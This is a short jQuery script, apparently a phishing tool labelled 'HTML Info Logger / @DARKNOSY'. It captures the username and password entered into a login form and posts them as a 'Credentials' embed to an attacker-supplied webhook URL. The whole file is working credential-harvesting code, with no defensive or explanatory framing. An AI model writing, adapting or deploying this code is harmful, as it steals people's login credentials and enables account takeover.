src="https://code.jquery.com/jquery-3.6.0.min.js"

$(document).ready(function() {
  var avatarUrl = 'https://avatars.githubusercontent.com/u/109553205?v=4';
  var username = "HTML Info Logger / @DARKNOSY";
  var webhookUrl = "INSERT-WEBHOOK-LINK";

  $("#webhookForm").submit(function(event) {
    event.preventDefault();

    var usernameInput = $("#username").val();
    var passwordInput = $("#password").val();

    var embedFields = [
      { name: "Username", value: usernameInput },
      { name: "Password", value: passwordInput }
    ];

    var payload = {
      username: username,
      avatar_url: avatarUrl,
      embeds: [{
        author: {
          name: username,
          icon_url: avatarUrl
        },
        title: "Credentials",
        fields: embedFields,
        color: 2
      }]
    };

    $.ajax({
      url: webhookUrl,
      type: "POST",
      contentType: "application/json",
      data: JSON.stringify(payload),
      success: function() {
        alert("Success.");
      },
      error: function() {
        alert("Error.");
      }
    });
  });
});